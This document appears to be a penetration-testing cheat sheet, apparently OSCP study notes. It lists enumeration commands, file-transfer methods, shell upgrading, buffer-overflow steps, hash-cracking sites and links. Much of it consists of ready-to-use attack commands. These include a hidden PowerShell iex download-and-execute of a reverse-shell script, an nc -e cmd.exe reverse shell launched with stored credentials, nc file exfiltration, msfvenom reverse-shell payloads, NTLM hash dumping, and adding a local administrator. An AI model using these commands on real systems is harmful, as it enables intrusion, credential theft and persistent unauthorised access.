Tips
=================================================

LinuxEnum: 
--------------------------------------------------

find / -perm -4000 2>/dev/null   //SUID files   
find / -perm -u=s -type f 2>/dev/null  //SUID files
uname -a                         //Posible Linux Kernel Exploit  

### Tools:
[enum4linux](https://github.com/portcullislabs/enum4linux) //enum all  
[pspy](https://github.com/DominicBreuker/pspy) //Process monitoring in LiveMod

WindowsEnum:
--------------------------------------------------
whoami /all  
systeminfo  

[WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)  
[fgdump.exe](https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump)  /// DumpPassword NTLM Hashes  


SMBEnum:
--------------------------------------------------
nmblookup -A [ip]    
nbtscan [ip]    
smbmap -H [ip]    
smbclient -L [ip]    
smbclient //[ip]/tmp    

rpcclient -U "" -N [ip]      
enumdomusers  

nmap --script smb-vuln* -p 139,445 [ip]    
nmap --script smb-enum-shares -p 139,445 [ip]  
enum4linux -a [ip]    
  
File Transfer:
--------------------------------------------------
### nc:
nc -l -p 4445 > ovrflw  
nc -w 5 10.10.14.18 4445 < /usr/local/bin/ovrflw  

### powershell:

iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/file')  
Invoke-WebRequest "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "C:\Users\Public\Documents\file.exe") 

powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')  

rdesktop (ip) -r disk:share=/home/store  
xfreerdp /u:alex /v:10.10.10.10 +clipboard  

Interactive shell:
--------------------------------------------------
python3 -c "import pty;pty.spawn('/bin/bash')"  
Ctrl+Z  
stty raw -echo  
fg  
stty rows 56 columns 213  

BufOverFlow:
--------------------------------------------------
ldd ovrflw | grep libc  
readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep system  
readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit  

Create pattern: /opt/metasploit-framework/tools/exploit/pattern_create.rb -l 100  
Pattern Offset: /opt/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x0000000  

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f python -b "\x00" -v shell  


PSChangeUser  
----------------------------------------------------
$username = 'alice'  
$password = 'alicepass'  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force  
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword  
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nv","10.10.10.10","443","-e","cmd.exe") -WorkingDirectory C:\Users\Public  

PSAddAdminUser  
net user /add [*username] [password]  
net localgroup administrators [username] /add  
net localgroup "Remote Desktop Users" alex /add  

Hashes decrypt:
--------------------------------------------------
http://rainbowtables.it64.com/  
http://cracker.offensive-security.com/  Priority Code:1337123456  
https://passwordrecovery.io/  
https://crackstation.net/  
https://gpuhash.me/  
https://cmd5.org/   

MSFVenom Shell:
--------------------------------------------------
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > shell.war  

Compile:
--------------------------------------------------
apt-get install libc6-dev-i386 gcc -Wall -m32 -o <output> <code>  // on x64 for x32  
gcc -Wall -m64 -o <output> <code>  // on x64 for x64  

Pivoting:
--------------------------------------------------
https://github.com/21y4d/Notes/blob/master/Pivoting.txt  

Links:
--------------------------------------------------
https://book.hacktricks.xyz/    //Cheat Sheet Pentesting all the thing   
https://github.com/egre55/ultimate-file-transfer-list/blob/master/README.md    //File Transfer Cheat Sheet  
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/   //SMB enumeration CheatSheet  
https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/    //BuferOverFlow tutor  
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  //Linux PrivEsc Tips
https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html  //Reverse Shells  
https://www.fuzzysecurity.com/tutorials/16.html  //WindowsPrivEsc   
https://refabr1k.gitbook.io/oscp/reverse-shell  //StudyNotes  
https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html  //SQLTips  
http://www.securityidiots.com/Web-Pentest/SQL-Injection/  //MoreSQL  
https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh  //nmapAutomator  
